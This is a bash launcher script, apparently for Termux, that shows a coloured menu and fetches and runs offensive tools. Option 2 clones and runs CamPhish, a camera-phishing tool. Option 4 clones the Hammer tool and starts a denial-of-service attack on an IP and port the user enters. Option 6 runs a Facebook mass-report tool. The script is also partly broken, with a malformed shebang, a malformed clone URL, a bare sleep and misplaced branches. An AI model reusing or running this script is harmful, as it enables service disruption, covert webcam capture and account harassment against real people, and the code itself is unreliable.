#!bin/bash
pkg update
pkg install cmatrix
pkg install python
clear
sleep 2

red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"

echo -e "$pink  mm#?mm    ?##mm##?"
echo -e "$blue    #          ?    "
echo -e "$cyan    m          #    "
echo -e "$grn    ?          m    "
echo -e "$ylo    m          ?    "
echo -e "$red    #          #    "
echo
sleep 1
echo -e "$grn  |---------ThIaK_MmCk--------|"
sleep 1
echo
echo -e  "$red  [1]Find web ip"
echo
sleep 1
echo -e "$cyan  [2] CamPhish"
echo "   (need hotsopt)"
echo
sleep 1
echo -e "$ylo  [3] cmatrix"
echo
sleep 1
echo -e "$blue  [4]DDoS-Hammer"
echo
sleep 1 
echo -e "$grn  [5]T-Header" 
echo
sleep 1
echo -e "$pink  [6]Report FB ACC"
echo
sleep 1
echo -e "$rset  [7]Exit"
echo
sleep 1
echo -e "$cyan ＞＞＞>>>CHOOSE<<<＜＜＜"
echo
sleep 0.5
read -p "    Enter : " t

if [[ $t == 1 ]];then
read -p "Enter web name : " wb
pkg install dnsutils -y
clear
sleep 1
nslookup $wb

elif [[ $t == 2 ]];then
apt-get -y install php openssh git wget
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash CamPhish.sh

elif [[ $t == 3 ]];then
cmatrix

elif [[ $t == 4 ]];then
git clone https://github.com/Pavithran-R/Hammer
cd Hammer
read -p "Type web ip : " ip
echo
sleep 1
read -p "Enter port : " po
echo
sleep 1
read -p "Enter turbo : " st
echo "the attack has begun"
sleep 1

python3 hammer.py -s $ip -p $po -t $st

elif [[ $t == 5 ]];then
git clone https://remo7777/T-Header
cd T-Header
bash T-Header.sh
pkg install dnsutils -y
clear
read -p "Enter web name : " wb
echo 
sleep
nslookup $wb
echo "Return main page(y/n)"
read -p "Enter : " yn

elif [[ $yn == y ]];then
bash easy.sh

elif [[ $yn == n ]];then
echo
echo "OK"
exit

elif [[ $t == 6 ]];then
pkg install python2
git clone https://github.com/IlayTamvan/Report
cd Report
ls
unzip Report.zip
python2 Report.py

elif [[ $t == 7 ]];then
exit

fi
